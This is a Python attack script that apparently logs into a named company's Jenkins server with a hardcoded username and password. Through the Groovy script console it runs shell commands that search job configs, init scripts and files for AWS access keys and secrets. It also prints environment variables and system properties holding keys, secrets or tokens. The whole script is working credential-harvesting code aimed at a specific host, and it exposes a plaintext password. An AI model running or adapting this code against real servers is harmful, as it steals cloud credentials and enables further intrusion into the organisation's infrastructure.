import requests
import urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False

crumb_r = s.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
crumb_r.raise_for_status()
crumb_data = crumb_r.json()
crumb_header = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
print(f"[+] Crumb OK")


def run_groovy(script, label="", timeout=50):
    print(f"\n{'='*80}\n[*] {label}")
    try:
        resp = s.post(
            f"{JENKINS}/scriptText",
            data={"script": script, crumb_header: crumb_value},
            timeout=timeout
        )
        print(f"[+] Status: {resp.status_code} | Length: {len(resp.text)}")
        if resp.status_code == 200:
            print(resp.text)
        else:
            print(resp.text[:500])
        return resp.text if resp.status_code == 200 else ""
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""


# Q1: Check shared libraries for AWS references
q1 = r'''
import org.jenkinsci.plugins.workflow.libs.GlobalLibraries
import jenkins.model.Jenkins

println "=== SHARED LIBRARIES ==="
try {
    def libs = GlobalLibraries.get().libraries
    libs.each { lib ->
        println "Lib: ${lib.name} | Default: ${lib.defaultVersion} | SCM: ${lib.retriever}"
    }
} catch(e) { println "No GlobalLibraries plugin or empty: ${e.message}" }

println "\n=== CHECKING LIBRARY WORKSPACE FILES ==="
def proc = ["bash", "-c", "find /var/jenkins_home/libs -type f 2>/dev/null | head -20; find /var/jenkins_home/workflow-libs -type f 2>/dev/null | head -20"].execute()
proc.waitFor()
println proc.text
'''
run_groovy(q1, "SHARED LIBRARIES")

# Q2: Check all XML configs that mention env/amazon/aws with context
q2 = r'''
def proc = ["bash", "-c", "grep -r -C2 -i 'amazon\\|aws_access\\|aws_secret\\|AKIAJ' /var/jenkins_home/jobs/ --include='*.xml' 2>/dev/null | head -60"].execute()
proc.waitFor()
println "=== GREP AWS WITH CONTEXT ==="
println proc.text
'''
run_groovy(q2, "GREP XML WITH AWS CONTEXT")

# Q3: Check environment variable bindings in pipeline definitions
q3 = r'''
import jenkins.model.Jenkins
import org.jenkinsci.plugins.workflow.job.WorkflowJob

println "=== PIPELINE ENV BINDINGS ==="
Jenkins.instance.allItems(WorkflowJob.class).take(60).each { job ->
    try {
        def def_ = job.definition
        if (def_?.class?.name?.contains("CpsScmFlowDefinition")) {
            // SCM-based pipeline
        }
        // Check for properties with env vars
        job.properties.each { prop ->
            if (prop.class.name.contains("EnvVars") || prop.class.name.contains("ParametersDefinition")) {
                println "\nJOB: ${job.fullName} | Prop: ${prop.class.simpleName}"
                if (prop.hasProperty('parameterDefinitions')) {
                    prop.parameterDefinitions.each { pd ->
                        def val = pd.defaultValue ?: pd.defaultParameterValue?.value
                        if (val && val.toString() =~ /(?i)(AWS|S3|KEY|SECRET|AKIAJ)/) {
                            println "  PARAM: ${pd.name} = ${val}"
                        }
                    }
                }
            }
        }
    } catch(e) {}
}
'''
run_groovy(q3, "PIPELINE ENV/PARAM BINDINGS")

# Q4: Check /var/jenkins_home for any other .env, .properties, credentials files
q4 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home -maxdepth 2 -type f \\( -name '*.env' -o -name '*.properties' -o -name 'credentials' -o -name '*.conf' \\) 2>/dev/null | grep -v '.java' | head -30"].execute()
proc.waitFor()
println "=== ROOT LEVEL CONFIG FILES ==="
println proc.text

def proc2 = ["bash", "-c", "find /var/jenkins_home -maxdepth 2 -name '*.groovy' 2>/dev/null | head -20"].execute()
proc2.waitFor()
println "\n=== GROOVY INIT SCRIPTS ==="
println proc2.text

// Read init.groovy.d scripts
def proc3 = ["bash", "-c", "cat /var/jenkins_home/init.groovy.d/*.groovy 2>/dev/null; cat /var/jenkins_home/init.groovy 2>/dev/null"].execute()
proc3.waitFor()
if (proc3.text.trim()) {
    println "\n=== INIT GROOVY CONTENT ==="
    println proc3.text.take(5000)
}
'''
run_groovy(q4, "ROOT CONFIG FILES + INIT SCRIPTS")

# Q5: Try to grep for S3/AWS in ALL text files in jenkins_home (fast, limited depth)
q5 = r'''
def proc = ["bash", "-c", "grep -r -l -i 'AKIAJ\\|aws_access_key_id\\|aws_secret_access_key\\|s3.amazonaws' /var/jenkins_home/ --include='*.groovy' --include='*.sh' --include='*.py' --include='*.conf' --include='*.cfg' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.properties' --include='*.json' --include='*.php' -m 5 2>/dev/null | head -15"].execute()
proc.waitFor()
println "=== FILES WITH AWS KEYS (all types) ==="
def files = proc.text.trim()
println files
if (files) {
    files.split('\n').take(5).each { path ->
        println "\n--- ${path} ---"
        try { println new File(path).text.take(4000) } catch(e) {}
    }
}
'''
run_groovy(q5, "GREP ALL TEXT FILES FOR AWS")

# Q6: Check plugins list for AWS plugins + system properties
q6 = r'''
import jenkins.model.Jenkins

println "=== AWS-RELATED PLUGINS ==="
Jenkins.instance.pluginManager.plugins.each { p ->
    if (p.shortName =~ /(?i)(aws|amazon|s3|cloud|ec2)/) {
        println "${p.shortName} (${p.version}) - ${p.displayName}"
    }
}

println "\n=== SYSTEM PROPERTIES WITH AWS/CLOUD ==="
System.properties.each { k, v ->
    if (k =~ /(?i)(aws|amazon|s3|cloud|secret|key)/) {
        println "${k} = ${v}"
    }
}

println "\n=== ENVIRONMENT VARS WITH AWS/SECRET ==="
System.getenv().each { k, v ->
    if (k =~ /(?i)(AWS|S3|SECRET|ACCESS|TOKEN|KEY|CLOUD)/) {
        println "${k} = ${v}"
    }
}
'''
run_groovy(q6, "AWS PLUGINS + SYSTEM ENV")
